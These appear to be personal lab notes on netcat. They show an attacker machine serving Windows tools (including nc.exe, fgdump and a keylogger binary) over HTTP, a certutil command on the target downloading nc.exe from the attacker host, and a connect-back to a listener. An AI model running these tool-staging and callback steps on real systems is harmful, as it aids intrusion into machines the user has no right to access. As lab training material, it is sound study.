# Netcat Fundamentals

Target machine is Windows so I need to upload Netcat file to the target
```bash
└─# ls -al /usr/share/windows-binaries/
total 2400
drwxr-xr-x  7 root root   4096 Jun 26  2024 .
drwxr-xr-x 18 root root   4096 Jun 26  2024 ..
drwxr-xr-x  2 root root   4096 Jun 26  2024 enumplus
-rwxr-xr-x  1 root root  53248 Mar  3  2023 exe2bat.exe
drwxr-xr-x  2 root root   4096 Jun 26  2024 fgdump
drwxr-xr-x  2 root root   4096 Jun 26  2024 fport
-rwxr-xr-x  1 root root  23552 Mar  3  2023 klogger.exe
drwxr-xr-x  2 root root   4096 Jun 26  2024 mbenum
drwxr-xr-x  4 root root   4096 Jun 26  2024 nbtenum
-rwxr-xr-x  1 root root  59392 Mar  3  2023 nc.exe   <- Netcat
-rwxr-xr-x  1 root root 837936 Mar  3  2023 plink.exe
-rwxr-xr-x  1 root root 704512 Mar  3  2023 radmin.exe
-rwxr-xr-x  1 root root 364544 Mar  3  2023 vncviewer.exe
-rwxr-xr-x  1 root root 308736 Mar  3  2023 wget.exe
-rwxr-xr-x  1 root root  66560 Mar  3  2023 whoami.exe

└─# cd  /usr/share/windows-binaries/

# Set up webserver host all the file in this directory
└─# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

On Target machine
```bash
# Target machine Compand Prompt
cd Desktop
certutil -urlcache -f http://10.10.38.2/nc.exe nc.exe
```

Attacker machine
```bash
# Terminate session
└─# cd ~/Desktop

# Set up Listener port
└─# nc -nvlp 1234
listening on [any] 1234 ...
```

Target machine
```bash
# Connect to attacker machine (10.10.38.2 port 1234)
nc.exe 10.10.38.2 1234
```

Attacker machine
```bash
└─# nc -nvlp 1234
listening on [any] 1234 ...
# Connected!
connect to [10.10.38.2] from (UNKNOWN) [10.0.29.242] 49660
```
